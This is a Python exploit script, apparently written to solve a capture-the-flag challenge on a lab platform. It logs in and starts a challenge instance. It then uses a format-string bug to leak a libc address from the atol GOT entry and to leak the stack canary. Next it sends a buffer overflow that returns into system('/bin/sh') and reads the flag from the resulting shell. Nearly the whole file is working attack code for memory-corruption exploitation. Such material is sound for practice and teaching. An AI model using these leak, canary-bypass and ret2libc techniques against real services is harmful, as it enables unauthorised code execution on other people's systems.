import sys, json, re, time, socket, struct
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r"D:\ctf-index")
from cylab2 import CyLab

ANSWER = -2623
ATOL_GOT = 0x804BFE4
ATOL_OFF = 0x3D2E0
SYSTEM_OFF = 0x4F8E0
BINSH_OFF = 0x1BCDE8


def p32(x):
    return struct.pack("<I", x & 0xFFFFFFFF)


cy = CyLab(delay=1.0)
cy.login()
cy.req("PUT", "/api/challenges/89/instance/?source=library")
host = port = None
for _ in range(12):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/89/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        m = re.search(r"nc\s+([A-Za-z0-9.\-]+)\s+(\d+)", d.get("description") or "")
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("cible:", host, port)
s = socket.create_connection((host, port), timeout=20)
s.settimeout(8)
time.sleep(0.4)
try:
    s.recv(8192)
except Exception:
    pass


def drain(t=0.8):
    time.sleep(t)
    out = b""
    try:
        while True:
            c = s.recv(65536)
            if not c:
                break
            out += c
            if b"guess?" in out:
                break
    except Exception:
        pass
    return out


def win_round(payload, wait=0.8):
    s.sendall(f"{ANSWER}\n".encode())
    time.sleep(0.4)
    try:
        s.recv(8192)
    except Exception:
        pass
    s.sendall(payload + b"\n")
    return drain(wait)


r = win_round(p32(ATOL_GOT) + b"%7$s")
i = r.find(b"Congrats: ")
atol = int.from_bytes(r[i + 14:i + 18], "little")
base = atol - ATOL_OFF
system = base + SYSTEM_OFF
binsh = base + BINSH_OFF
print("atol:", hex(atol), "base:", hex(base), "system:", hex(system))
r = win_round(b"%135$p")
m = re.search(rb"Congrats: (0x[0-9a-f]+)", r)
canary = int(m.group(1), 16)
print("canary:", hex(canary))
payload = b"A" * 512 + p32(canary) + b"B" * 8 + p32(0xDEADBEEF) + p32(system) + p32(0x41414141) + p32(binsh)
print("payload len:", len(payload))
s.sendall(f"{ANSWER}\n".encode())
time.sleep(0.4)
try:
    s.recv(8192)
except Exception:
    pass
s.sendall(payload + b"\n")
time.sleep(1.5)
drain(1.0)
s.sendall(b"cat flag.txt; cat flag; ls -la\n")
time.sleep(2.5)
out = b""
try:
    while True:
        c = s.recv(65536)
        if not c:
            break
        out += c
except Exception:
    pass
txt = out.decode("utf-8", "replace")
print("=== SHELL ===")
print(txt[:1000])
f = re.search(r"(?:academy|picoCTF)\{[^}]*\}", txt)
print("FLAG:", f.group(0) if f else "non trouve")
s.close()
